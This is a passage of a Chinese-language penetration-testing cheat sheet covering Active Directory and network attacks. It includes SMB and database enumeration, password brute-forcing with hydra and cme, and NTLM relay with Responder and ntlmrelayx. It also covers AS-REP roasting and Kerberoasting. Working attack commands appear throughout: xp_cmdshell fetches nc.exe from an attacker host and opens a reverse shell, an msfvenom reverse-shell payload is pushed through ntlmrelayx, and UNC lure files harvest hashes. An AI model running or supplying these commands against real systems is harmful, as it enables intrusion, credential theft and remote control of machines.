+net rpc group members <span class="token string">"Domain Admins"</span> <span class="token parameter variable">-I</span> <span class="token variable">$IP</span> -U%
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating groups ##########"</span>
+nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sS</span> -p139,445 <span class="token parameter variable">--script</span><span class="token operator">=</span>smb-enum-groups <span class="token variable">$IP</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating shares ##########"</span>
+nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sS</span> -p139,445 <span class="token parameter variable">--script</span><span class="token operator">=</span>smb-enum-shares <span class="token variable">$IP</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Bruteforcing all users with 'password', blank and username as password"</span>
+hydra <span class="token parameter variable">-e</span> ns <span class="token parameter variable">-L</span> /tmp/<span class="token variable">$IP</span>-users.txt <span class="token parameter variable">-p</span> password <span class="token variable">$IP</span> smb <span class="token parameter variable">-t</span> <span class="token number">1</span>
+<span class="token function">rm</span> /tmp/<span class="token variable">$IP</span>-users.txt</code></pre>
+
+<h2 id="枚举ldap"><a href="#枚举ldap" class="headerlink" title="枚举ldap"></a><strong>枚举ldap</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> <span class="token string">"ldap* and not brute"</span> <span class="token parameter variable">-p</span> <span class="token number">389</span> <span class="token number">192.168</span>.31.34</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">ldapsearch <span class="token parameter variable">-x</span> <span class="token parameter variable">-s</span> base <span class="token parameter variable">-H</span> ldap://192.168.31.34</code></pre>
+
+<h2 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a><strong>用户枚举</strong></h2><h3 id="SMB用户枚举"><a href="#SMB用户枚举" class="headerlink" title="SMB用户枚举"></a><strong>SMB用户枚举</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token parameter variable">-U</span> <span class="token number">192.168</span>.31.34 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'user:'</span>
+cme smb <span class="token number">192.168</span>.31.34 <span class="token parameter variable">--users</span>
+net rpc group members <span class="token string">'Domain Users'</span> <span class="token parameter variable">-W</span> <span class="token string">'hacker.com'</span> <span class="token parameter variable">-l</span> <span class="token number">192.168</span>.31.34 <span class="token parameter variable">-U</span> <span class="token string">'%'</span></code></pre>
+
+<h3 id="kerbrute用户名枚举"><a href="#kerbrute用户名枚举" class="headerlink" title="kerbrute用户名枚举"></a><strong>kerbrute用户名枚举</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">./kerbrute_linux_amd64 userenum <span class="token parameter variable">--dc</span> <span class="token number">192.168</span>.56.116 <span class="token parameter variable">-d</span> cons.thl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</code></pre>
+
+<h3 id="ldap用户名枚举"><a href="#ldap用户名枚举" class="headerlink" title="ldap用户名枚举"></a><strong>ldap用户名枚举</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">./ldapnomnom-linux-x64 <span class="token parameter variable">-input</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt <span class="token parameter variable">-server</span> <span class="token number">192.168</span>.1.102 </code></pre>
+
+<h3 id="使用-IPC-枚举用户"><a href="#使用-IPC-枚举用户" class="headerlink" title="使用 IPC$ 枚举用户"></a><strong>使用 IPC$ 枚举用户</strong></h3><blockquote>
+<p><code>lookupsid.py</code> 利用 Windows 开放的 LSA RPC 接口（通常通过 <code>\pipe\lsarpc</code>）在匿名或认证连接的情况下，枚举出主机或域中的用户&#x2F;组账户名称</p>
+</blockquote>
+<p>如果可以匿名访问IPC$或者有个用户可以访问IPC$，那么可以用lookupsid.py进行用户枚举</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lookupsid.py anonymous@10.10.215.206
+lookupsid.py vicky.tale@192.168.56.19</code></pre>
+
+<h2 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a><strong>SMB密码爆破</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">cme smb <span class="token number">192.168</span>.10.5 <span class="token parameter variable">-u</span> username.txt <span class="token parameter variable">-p</span> username.txt --continue-on-success
+hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> user.txt <span class="token number">192.168</span>.56.197 smb <span class="token parameter variable">-t</span> <span class="token number">1</span>
+use auxiliary/scanner/smb/smb_login</code></pre>
+
+<h2 id="NFS攻击-111-2049"><a href="#NFS攻击-111-2049" class="headerlink" title="NFS攻击(111,2049)"></a><strong>NFS攻击(111,2049)</strong></h2><p>NFS类似smb，可用于网络访问文件</p>
+<p>检测nfs是否可用</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">rpcinfo <span class="token parameter variable">-p</span> <span class="token number">192.168</span>.56.19</code></pre>
+
+<p>如果nfs可用，显示所有的mount</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">showmount <span class="token parameter variable">-e</span> <span class="token number">192.168</span>.56.19</code></pre>
+
+<p>挂在共享点</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">192.168</span>.56.19:/share /mnt/nfs</code></pre>
+
+<p>卸载共享</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">umount</span> <span class="token parameter variable">-f</span> <span class="token parameter variable">-l</span> /mnt/nfs</code></pre>
+
+<h2 id="DNS枚举-53"><a href="#DNS枚举-53" class="headerlink" title="DNS枚举(53)"></a><strong>DNS枚举(53)</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> hsploit.com
+<span class="token function">dig</span> hsploit.com <span class="token parameter variable">-t</span> mx  <span class="token comment">#执行邮件服务</span>
+<span class="token function">dig</span> hsploit.com <span class="token parameter variable">-t</span> ns +short <span class="token comment">#对输出进行排序</span>
+<span class="token function">nslookup</span> hsploit.com</code></pre>
+
+<h3 id="查找特定记录"><a href="#查找特定记录" class="headerlink" title="查找特定记录"></a><strong>查找特定记录</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">host</span> google.com</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">查找邮件服务
+<span class="token function">host</span> <span class="token parameter variable">-t</span> mx google.com
+查找域名服务
+<span class="token function">host</span> <span class="token parameter variable">-t</span> ns google.com
+查找txt记录
+<span class="token function">host</span> <span class="token parameter variable">-t</span> txt google.com</code></pre>
+
+<h3 id="DNS域传输漏洞"><a href="#DNS域传输漏洞" class="headerlink" title="DNS域传输漏洞"></a><strong>DNS域传输漏洞</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> axfr hack.com @192.168.31.34 <span class="token comment">#获取域内ip和域名记录</span></code></pre>
+
+<h3 id="反查"><a href="#反查" class="headerlink" title="反查"></a><strong>反查</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> <span class="token parameter variable">-x</span> <span class="token number">142.250</span>.183.78 +short 
+<span class="token function">host</span> <span class="token number">209.51</span>.188.148</code></pre>
+
+<h2 id="POP3枚举-110-25"><a href="#POP3枚举-110-25" class="headerlink" title="POP3枚举(110,25)*"></a><em><em>POP3枚举(110,25</em>)</em>*</h2><blockquote>
+<p>是一种计算机网络和 Internet 标准<strong>协议</strong>，可从远程邮件服务器提取和检索电子邮件以供主机访问</p>
+</blockquote>
+<pre class="language-bash" data-language="bash"><code class="language-bash">telnet <span class="token number">192.168</span>.56.19 <span class="token number">110</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">POP 命令:
+  <span class="token environment constant">USER</span> uid           以用户 <span class="token string">"uid"</span>登录
+  PASS password      使用实际密码替代 <span class="token string">"password"</span> 进行身份验证
+  STAT               显示邮件数量和邮箱总大小
+  LIST               列出所有邮件及其大小
+  RETR n             显示第 n 封邮件的全部内容
+  DELE n             将第 n 封邮件标记为删除（断开连接时删除）
+  RSET               撤销所有删除操作（重置状态）
+  QUIT               注销并断开连接（如果之前有 DELE 且未使用 RSET，则执行删除）
+  TOP msg n          显示第 msg 封邮件的前 n 行内容（用于预览）
+  CAPA               获取服务器支持的功能（Capabilities）</code></pre>
+
+<h2 id="Mysql枚举-3306"><a href="#Mysql枚举-3306" class="headerlink" title="Mysql枚举(3306)"></a><strong>Mysql枚举(3306)</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-vv</span> <span class="token parameter variable">--script</span><span class="token operator">=</span>mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <span class="token variable">$ip</span> <span class="token parameter variable">-p</span> <span class="token number">3306</span>
+
+nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-vv</span> <span class="token parameter variable">-script</span><span class="token operator">=</span>mysql* <span class="token variable">$ip</span> <span class="token parameter variable">-p</span> <span class="token number">3306</span></code></pre>
+
+<p>mysql连接</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> root  <span class="token comment">#无密码连接</span>
+mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span> <span class="token comment">#密码连接</span>
+mysql <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>Hostname<span class="token operator">></span> <span class="token parameter variable">-u</span> root
+mysql <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.56.19 <span class="token parameter variable">-u</span> root@localhost</code></pre>
+
+<p>如果 Mysql 以 root 身份运行并且您有访问权限，则可以运行命令</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> do_system<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+mysql<span class="token operator">></span> <span class="token punctuation">\</span><span class="token operator">!</span> <span class="token function">sh</span></code></pre>
+
+<p>dump数据库</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mysqldump <span class="token parameter variable">-u</span> admin <span class="token parameter variable">-p</span> admin --all-databases --skip-lock-tables </code></pre>
+
+<h2 id="Oracle枚举-1521"><a href="#Oracle枚举-1521" class="headerlink" title="Oracle枚举(1521)"></a><strong>Oracle枚举(1521)</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> <span class="token number">1521</span> <span class="token parameter variable">-A</span> <span class="token variable">$ip</span>
+
+nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-p</span> <span class="token number">1521</span> –script<span class="token operator">=</span>oracle-enum-users –script-args <span class="token assign-left variable">sid</span><span class="token operator">=</span>ORCL,userdb<span class="token operator">=</span>users.txt <span class="token variable">$ip</span>
+
+nmap <span class="token parameter variable">--script</span> <span class="token string">"oracle-tns-version"</span> <span class="token parameter variable">-p</span> <span class="token number">1521</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sV</span> <span class="token operator">&lt;</span>IP<span class="token operator">></span>
+<span class="token comment"># TNS listener version</span>
+
+nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>oracle-sid-brute <span class="token variable">$ip</span>
+nmap  <span class="token parameter variable">-n</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-p</span> <span class="token number">1521</span> <span class="token parameter variable">--script</span><span class="token operator">=</span>oracle-brute <span class="token variable">$ip</span>
+<span class="token comment"># Brute-Force Account</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">oscanner <span class="token parameter variable">-s</span> <span class="token variable">$ip</span> <span class="token parameter variable">-P</span> <span class="token number">1521</span></code></pre>
+
+<h2 id="MSSQL枚举-1433"><a href="#MSSQL枚举-1433" class="headerlink" title="MSSQL枚举(1433)"></a><strong>MSSQL枚举(1433)</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-p</span> <span class="token number">1433</span> –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password <span class="token variable">$ip</span>
+
+<span class="token comment">#爆破</span>
+nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-p</span> <span class="token number">1433</span> –script ms-sql-brute –script-args <span class="token assign-left variable">userdb</span><span class="token operator">=</span>users.txt,passdb<span class="token operator">=</span>passwords.txt <span class="token variable">$ip</span></code></pre>
+
+<p>登录mssql</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mssqlclient.py <span class="token operator">&lt;</span>domain<span class="token operator">></span>/<span class="token operator">&lt;</span>username<span class="token operator">></span>:<span class="token operator">&lt;</span>password<span class="token operator">></span>@<span class="token variable">$ip</span>
+
+mssqlclient.py bathry/admin:pss123@192.168.11.15</code></pre>
+
+<p>然后rce</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">SQL<span class="token operator">></span> enable_xp_cmdshell
+
+SQL<span class="token operator">></span> xp_cmdshell copy <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.16.26<span class="token punctuation">\</span>gabbar<span class="token punctuation">\</span>nc.exe %temp%<span class="token punctuation">\</span>nc.exe
+
+SQL<span class="token operator">></span> xp_cmdshell %temp%/nc.exe <span class="token parameter variable">-e</span> cmd.exe <span class="token number">10.10</span>.16.26 <span class="token number">4444</span></code></pre>
+
+
+
+<h2 id="局域网攻击"><a href="#局域网攻击" class="headerlink" title="局域网攻击"></a><strong>局域网攻击</strong></h2><h3 id="IPv6-DNS欺骗"><a href="#IPv6-DNS欺骗" class="headerlink" title="IPv6 DNS欺骗"></a><strong>IPv6 DNS欺骗</strong></h3><p>攻击者在网络上宣布自己为 IPv6 DHCP 服务器和 DNS 服务器，该服务器诱使客户将请求发送到攻击者的计算机</p>
+<p>首先，假装自己是IPv6服务器</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mitm6 <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span>domain.tld<span class="token operator">></span></code></pre>
+
+<p>此时局域网内的ipv6客户端将会连接服务器请求WPAD 文件</p>
+<p>攻击者会返回一个恶意的WPAD文件，这样之后，客户端想通过某些协议连接(如HTTP)时，将通过NTLM对WPAD代理进行身份认证。</p>
+<p>然后，打NTLM 中继</p>
+<blockquote>
+<p>1.接收受害者发来的 HTTP 请求，其中包含 <strong>NTLM 认证信息</strong></p>
+<p>2.将这些认证请求转发（relay）到合法服务（如 LDAP）</p>
+<p>3.如果攻击者成功 relay 到域控（DC），就可能以受害者身份执行操作</p>
+</blockquote>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ntlmrelayx.py <span class="token parameter variable">-6</span> <span class="token punctuation">\</span> 
+<span class="token parameter variable">-t</span> ldaps://domain-controller-ip <span class="token punctuation">\</span> 
+<span class="token parameter variable">-wh</span> <span class="token operator">&lt;</span>wpadhostname.domain.tld<span class="token operator">></span> <span class="token punctuation">\</span> 
+<span class="token parameter variable">-l</span> lootdir</code></pre>
+
+<h3 id="LLMNR-NBTNS-MDNS"><a href="#LLMNR-NBTNS-MDNS" class="headerlink" title="LLMNR&#x2F;NBTNS&#x2F;MDNS"></a><strong>LLMNR&#x2F;NBTNS&#x2F;MDNS</strong></h3><p><strong>LLMNR</strong> 是一种<strong>主机名解析协议</strong>，在局域网中用于替代 DNS，当 DNS 无法解析主机名时使用</p>
+<p><strong>投毒攻击</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">responder <span class="token parameter variable">-I</span> eth0 <span class="token comment">#伪造响应获取用户NTLM 哈希</span></code></pre>
+
+<h2 id="SMB中继攻击"><a href="#SMB中继攻击" class="headerlink" title="SMB中继攻击"></a><strong>SMB中继攻击</strong></h2><h3 id="SMB-中继攻击概述"><a href="#SMB-中继攻击概述" class="headerlink" title="SMB 中继攻击概述"></a><strong>SMB 中继攻击概述</strong></h3><p>SMB 中继攻击是指攻击者捕获用户发出的 Net-NTLM 哈希，然后将其中继以访问网络上已禁用 SMB 签名的另一台计算机</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723223714575.png" alt="image-20250723223714575" loading="lazy"></p>
+<p>此外，SMB 中继攻击在不同的工作场景中又有着不一样的利用方式</p>
+<p>（1）在<strong>工作组</strong>环境中，机器之间相互没有信任关系，因此想中继到其它机器是不太现实的。但是可以中继到机器自身的，只不过这种方式微软已通过补丁 MS08-068 做了限制，严禁在中继到机器自身</p>
+<p>（2）在<strong>域环境</strong>中，普通域用户默认可以登录除域控外的其它所有机器，因此可以将域用户的 Net-NTLM 哈希中继到域内的其它机器。所以，SMB 中继攻击在域中会更为常见</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723223851594.png" alt="image-20250723223851594" loading="lazy"></p>
+<p>如果被中继的帐户恰好在被中继的机器上具有本地管理权限，那么就可以利用它们的权限转储主机上的 SAM 哈希或获取主机上的 SYSTEM shell</p>
+<blockquote>
+<p>注：在域环境中，身份验证通常优先使用 Kerberos 协议，NTLM 作为回退机制。当 Kerberos 不可用时，例如无法获取服务票据或目标服务不支持 Kerberos，客户端会自动回退使用 NTLM。而中继攻击，如使用 ntlmrelayx.py 实现的攻击，依赖于受害者使用 NTLM 协议进行身份验证。因此，该攻击程序通常通过控制网络流量或与目标服务建立不支持 Kerberos 的连接，从而促使客户端使用 NTLM，进而实现认证中继</p>
+</blockquote>
+<h3 id="枚举已禁用-SMB-签名的主机"><a href="#枚举已禁用-SMB-签名的主机" class="headerlink" title="枚举已禁用 SMB 签名的主机"></a><strong>枚举已禁用 SMB 签名的主机</strong></h3><p>为了可以发起 SMB 中继攻击，我们需要做的第一件事就是找到那些在网络中已禁用 SMB 签名的机器</p>
+<ul>
+<li>启用后，在尝试传递凭据时，域会知道你不是那个真正的人，因为数据包未由你签名，因此它不会让你进入。</li>
+<li>禁用后，域将不会检查请求来源的真实性，而只是看到用户 + 哈希值，并允许你进入系统。（前提是你有权限）</li>
+</ul>
+<pre class="language-bash" data-language="bash"><code class="language-bash">/usr/share/responder/tools/RunFinger.py <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.59.19
+
+cme smb <span class="token number">192.168</span>.56.19 --gen-relay-list a.txt</code></pre>
+
+<p>关闭smb签名的指令</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">reg <span class="token function">add</span> HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Services<span class="token punctuation">\</span>LanmanServer<span class="token punctuation">\</span>Parameters /v RequireSecuritySignature /t REG_DWORD /d <span class="token number">0</span> /f</code></pre>
+
+<h2 id="诱导机器发送TNLM认证"><a href="#诱导机器发送TNLM认证" class="headerlink" title="诱导机器发送TNLM认证"></a><strong>诱导机器发送TNLM认证</strong></h2><p><strong><code>LLMNR&amp;NBNS</code>攻击</strong></p>
+<p>当用户输入任意一个不存在的名称，本地hosts文件和DNS服务器均不能正常解析该名称，所以系统就会发送<code>LLNMR/NBNS</code>数据包请求解析，此时Responder对目标主机进行<code>LLNMR/NBNS</code>毒化，并要求其输入凭据认证，然后就可以抓到目标机器的<code>Net-Ntlm hash</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>dddddd</code></pre>
+
+<p><strong>Inveigh</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">set-ExecutionPolicy RemoteSigned
+<span class="token comment">#这里选择为Y</span>
+
+.<span class="token punctuation">\</span>Inveigh.ps1
+Invoke-Inveigh <span class="token parameter variable">-ConsoleOutput</span> Y</code></pre>
+
+<p><strong>desktop.ini</strong></p>
+<p>每个文件夹下都有个隐藏文件<code>desktop.ini</code>其作用来用来指定文件夹图标等，正常情况是不可见的，可以通过修改文件夹属性去显示此文件。<br>当图标的一些路径改成指定的UNC路径，就能收到目标机器发来的NTLM请求。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.我们先新建一个文件夹test，然后随便修改一个文件夹图标
+<span class="token number">2</span>.文件夹选项取消勾选 隐藏受保护的操作系统文件，就会显示desktop.ini
+<span class="token number">3</span>.修改desktop.ini
+<span class="token punctuation">[</span>.ShellClassInfo<span class="token punctuation">]</span>
+<span class="token assign-left variable">IconResource</span><span class="token operator">=</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.56.19<span class="token punctuation">\</span>SHELL32.dll,4
+<span class="token number">4</span>.再次访问文件夹</code></pre>
+
+<p><strong>.scf后缀文件</strong></p>
+<blockquote>
+<p>SCF后缀的文件通常是Windows操作系统中使用的一种快捷方式文件。SCF文件是Shell Command File（Shell 命令文件）的缩写，它包含了一系列命令，用于执行特定的操作或打开特定的应用程序。</p>
+</blockquote>
+<p>这个利用方法和上面的<code>desktop.ini</code>的原理是一样的，<code>.scf</code>文件中包含<code>IconFile</code>属性，所以<code>explore.exe</code>服务器会尝试获取文件夹的图标，所以打开<code>.scf</code>所在的文件夹时，目标机器会尝试获取文件夹的图标，那我们通过修改<code>IconFile</code>也就像上面一样达到访问指定UNC机器的目的了。<br><code>.scf</code>文件的基本格式如下：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Shell<span class="token punctuation">]</span>Command<span class="token operator">=</span><span class="token number">2</span>
+<span class="token assign-left variable">IconFile</span><span class="token operator">=</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.2<span class="token punctuation">\</span>test<span class="token punctuation">\</span>test.ico
+<span class="token punctuation">[</span>Taskbar<span class="token punctuation">]</span>
+<span class="token assign-left variable">Command</span><span class="token operator">=</span>ToggleDesktop</code></pre>
+
+<p><strong>浏览器</strong></p>
+<p>当浏览器的访问页面含有UNC路径时，浏览器在解析该页面时也会尝试请求该UNC地址，发起NTLM认证。不同的浏览器有不同的UNC路径格式</p>
+<pre class="language-BASH" data-language="BASH"><code class="language-BASH">&lt;!doctype html&gt;
+&lt;htlm lang&#x3D;&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+&lt;head&gt;
+&lt;body&gt;
+   &lt;script src&#x3D;&quot;\\192.168.253.255\test&quot;&gt;&lt;&#x2F;script&gt;
+&lt;&#x2F;html&gt;</code></pre>
+
+<p>然后在被攻击机上访问这个文件</p>
+<p><strong>系统命令</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net.exe use <span class="token punctuation">\</span>hostshare
+attrib.exe <span class="token punctuation">\</span>hostshare
+cacls.exe <span class="token punctuation">\</span>hostshare
+cipher.exe <span class="token punctuation">\</span>hostshare
+expand.exe <span class="token punctuation">\</span>hostshare</code></pre>
+
+
+
+<h3 id="启动-Responder"><a href="#启动-Responder" class="headerlink" title="启动 Responder"></a><strong>启动 Responder</strong></h3><p>在使用 Responder 执行 SMB 中继攻击时，需要关闭 Responder 的SMB 和 HTTP 服务，这样便可以让其只监听请求而不做出响应，否则会影响 ntlmrelayx.py 的正常运行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> /usr/share/responder/Responder.conf</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723224623267.png" alt="image-20250723224623267" loading="lazy"></p>
+<h3 id="SMB中继攻击-1"><a href="#SMB中继攻击-1" class="headerlink" title="SMB中继攻击"></a><strong>SMB中继攻击</strong></h3><p>ntlmrelayx.py 会将收到的身份验证请求转发到另一台目标计算机，进而实现中继攻击</p>
+<p><strong>标准用户 + SMBClient Shell</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">responder <span class="token parameter variable">-I</span> eth1 <span class="token parameter variable">-v</span> <span class="token comment">#先开启LLMNR毒化</span>
+ntlmrelayx.py <span class="token parameter variable">-tf</span> ip.txt <span class="token parameter variable">-smb2support</span> <span class="token parameter variable">-i</span></code></pre>
+
+<p>此命令会将来自列表中任意 IP 的所有请求转发到列表中的所有 IP。如果从一台机器转发到另一台机器的帐户有权访问共享文件夹，那么由于我们使用了 <strong>-i</strong> 选项，这将在受害者的 11000 端口上创建一个绑定端口，然后就可以使用 netcat 进行访问</p>
+<p><strong>本地管理员用户 + SAM 哈希转储</strong></p>
+<p>拿到的ntlm用户恰好是目的机器的管理员,就可以转储本地SAM哈希</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">responder <span class="token parameter variable">-I</span> eth1 <span class="token parameter variable">-v</span> <span class="token comment">#先开启LLMNR毒化</span>
+ntlmrelayx.py <span class="token parameter variable">-tf</span> ip.txt <span class="token parameter variable">-smb2support</span> <span class="token parameter variable">-i</span></code></pre>
+
+<p><strong>本地管理员用户 + 命令执行 1</strong></p>
+<p>中继的账户恰好是本地管理员用户，那么该命令将以 SYSTEM 权限执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">responder <span class="token parameter variable">-I</span> eth1 <span class="token parameter variable">-v</span> <span class="token comment">#先开启LLMNR毒化</span>
+ntlmrelayx.py <span class="token parameter variable">-tf</span> ip.txt <span class="token parameter variable">-smb2support</span> <span class="token parameter variable">-c</span> <span class="token string">'whoami'</span></code></pre>
+
+<p><strong>本地管理员用户 + 命令执行 2</strong></p>
+<p>使用 ntlmrelayx 获取 Shell 的另一种技术是添加 <strong>-e</strong> 选项，此选项会自动将攻击者的机器的恶意 EXE 文件传输到受害者机器并执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">172.16</span>.1.30 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> shell.exe
+
+responder <span class="token parameter variable">-I</span> eth1 <span class="token parameter variable">-v</span> <span class="token comment">#先开启LLMNR毒化</span>
+ntlmrelayx.py <span class="token parameter variable">-tf</span> ip.txt <span class="token parameter variable">-smb2support</span> <span class="token parameter variable">-e</span> ./shell.exe</code></pre>
+
+<h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a><strong>AS-REP Roasting攻击</strong></h2><p>在AS-REP阶段，Logon Session Key是用用户密码的Hash加密的。对于域用户，如果设置了<code>Do not reqire Kerberos preauthentication</code>(不需要预认证)选项，攻击者会向域控的88端口发送AS_REQ,此时域控不会做任何验证就将TGT和该用户的Hash加密的Logon Session Key返回。这样，攻击者就可以对获取到的用户Hash加密的Logon Session Key进行破解，如果破解成功，就能拿到该用户的密码明文，这种攻击方式被称为<strong>AS-REP Roasting攻击</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#没有用户凭据枚举</span>
+GetNPUsers.py <span class="token parameter variable">-usersfile</span> user.txt -no-pass -dc-ip <span class="token number">192.168</span>.10.5 DORAEMON.THL/   
+
+<span class="token comment">#已经有用户凭据了再枚举</span>
+.<span class="token punctuation">\</span>Rubeus.exe asreproast
+
+GetNPUsers.py domain.local/user:password -dc-ip x.x.x.x <span class="token parameter variable">-outputfile</span> asrep.hashcat</code></pre>
+
+<h2 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a><strong>Kerberoasting攻击</strong></h2><p>在TGS-REP阶段，由于ST是用服务Hash加密的，因此，如果我们能获取到ST，就可以对该ST进行破解，得到服务的Hash，造成<strong>Kerberoasting攻击</strong>。这种攻击方式存在的另一个原因是用户向KDC发起TGS-REQ请求时，不管用户对服务有没有访问权限，只要TGT正确,KDC都会返回ST。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#TGS-REQ请求ST</span>
+GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">192.168</span>.56.128 soupedecode.local/ybob317  <span class="token parameter variable">-outputfile</span> hashes.kerberoast
+
+<span class="token comment">#如果没有密码，但是有用户列表尝试</span>
+GetUserSPNs.py domain.local/guest <span class="token parameter variable">-usersfile</span> users.txt <span class="token parameter variable">-request</span> <span class="token parameter variable">-outputfile</span> kerb.hashcat -dc-ip x.x.x.x -no-pass
+
+<span class="token comment">#在windows上</span>
+.<span class="token punctuation">\</span>Rubeus.exe kerberoast /nowrap
+</code></pre>
+
+<p>会拿到所有服务的哈希，可以使用john跑一下密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">5600</span> pass.txt wordlists.txt
+john aaa <span class="token parameter variable">--wordlists</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt</code></pre>
+
